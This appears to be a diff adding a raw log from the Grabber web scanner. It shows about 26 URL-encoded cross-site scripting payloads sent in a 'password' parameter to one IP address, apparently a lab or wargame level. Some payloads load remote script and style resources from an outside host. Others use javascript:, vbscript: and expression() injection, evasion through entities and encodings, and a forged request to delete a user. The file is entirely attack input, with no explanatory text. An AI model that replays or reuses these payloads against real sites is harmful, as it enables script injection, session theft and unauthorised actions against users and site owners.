@@ -1,0 +1,27 @@
+# Log from Grabber.py
+https://129.219.253.30:80/~level01/?password=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E
+https://129.219.253.30:80/~level01/?password=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E
+https://129.219.253.30:80/~level01/?password=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E
+https://129.219.253.30:80/~level01/?password=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E
+https://129.219.253.30:80/~level01/?password=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E
+https://129.219.253.30:80/~level01/?password=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E
+https://129.219.253.30:80/~level01/?password=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E
+https://129.219.253.30:80/~level01/?password=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE
+https://129.219.253.30:80/~level01/?password=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E
+https://129.219.253.30:80/~level01/?password=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E
+https://129.219.253.30:80/~level01/?password=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E
+https://129.219.253.30:80/~level01/?password=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E
+https://129.219.253.30:80/~level01/?password=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E
+https://129.219.253.30:80/~level01/?password=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E
+https://129.219.253.30:80/~level01/?password=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser
+https://129.219.253.30:80/~level01/?password=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E
+https://129.219.253.30:80/~level01/?password=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E
+https://129.219.253.30:80/~level01/?password=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E
+https://129.219.253.30:80/~level01/?password=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E
+https://129.219.253.30:80/~level01/?password=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E
+https://129.219.253.30:80/~level01/?password=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E
+https://129.219.253.30:80/~level01/?password=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E
+https://129.219.253.30:80/~level01/?password=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E
+https://129.219.253.30:80/~level01/?password=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E
+https://129.219.253.30:80/~level01/?password=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E
+https://129.219.253.30:80/~level01/?password=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E
